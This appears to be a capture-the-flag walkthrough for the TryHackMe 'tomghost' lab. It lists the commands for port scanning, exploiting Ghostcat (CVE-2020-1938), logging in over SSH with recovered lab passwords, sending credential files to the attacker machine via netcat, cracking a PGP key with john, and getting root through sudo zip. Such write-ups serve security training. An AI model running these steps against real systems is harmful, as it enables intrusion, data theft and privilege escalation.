# tomghost

### Initial Scan <a href="#initial-scan" id="initial-scan"></a>

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports <a href="#scan-all-ports" id="scan-all-ports"></a>

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## TCP/8080 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Initial Access**

**Victim**

```
git clone https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat.git 
cd Hacking-Vulnerability-CVE-2020-1938-Ghostcat/
python2 CVE-2020-1938.py $VICTIM -p 8009 -f WEB-INF/web.xml
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### **TCP/22 - SSH** <a href="#tcp-22-ssh" id="tcp-22-ssh"></a>

**Kali**

```
ssh skyfuck@$VICTIM
Password: 8730281lkjlkjdqlksalks
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Netcat <a href="#netcat" id="netcat"></a>

**Kali(receiving)**

```
nc -l -p 1234 > credential.pgp
nc -l -p 1234 > tryhackme.asc
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < credential.pgp
nc -w 3 $KALI 1234 < tryhackme.asc
```

**Kali**

```
/opt/john/gpg2john tryhackme.asc > pgp.hash
john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gpg --import tryhackme.asc 
Password: alexandru
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gpg --decrypt credential.pgp 
Password: alexandru
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation  <a href="#tcp-22-ssh" id="tcp-22-ssh"></a>

### **TCP/22 - SSH** <a href="#tcp-22-ssh" id="tcp-22-ssh"></a>

**Kali**

```
ssh merlin@$VICTIM
Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

**Exploit:** [https://gtfobins.github.io/gtfobins/zip/](https://gtfobins.github.io/gtfobins/zip/)

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
